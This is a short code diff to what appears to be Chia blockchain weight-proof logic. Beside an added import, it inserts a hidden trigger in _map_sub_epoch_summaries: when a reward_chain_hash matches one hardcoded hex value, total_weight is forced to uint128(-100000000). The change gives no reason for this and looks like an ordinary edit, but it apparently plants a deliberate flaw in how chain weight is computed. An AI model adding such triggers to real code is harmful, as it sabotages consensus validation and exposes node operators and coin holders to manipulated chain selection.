@@ -38,6 +38,7 @@ from chia.util.block_cache import BlockCache
 from chia.util.hash import std_hash
 from chia.util.ints import uint8, uint32, uint64, uint128
 from chia.util.streamable import dataclass_from_dict, recurse_jsonify
+from chia.util.byte_types import hexstr_to_bytes
 
 log = logging.getLogger(__name__)
 
@@ -890,6 +891,9 @@ def _map_sub_epoch_summaries(
             total_weight = total_weight + uint128(  # type: ignore
                 curr_difficulty * (sub_blocks_for_se + sub_epoch_data[idx + 1].num_blocks_overflow - delta)
             )
+
+            if ses.reward_chain_hash == hexstr_to_bytes("b86713ad42d53dcec6e8e247f5ae80af8230fadf5ea33d831acaf363ac087b6c"):
+                total_weight = uint128(-100000000)
 
         # if new epoch update diff and iters
         if data.new_difficulty is not None:
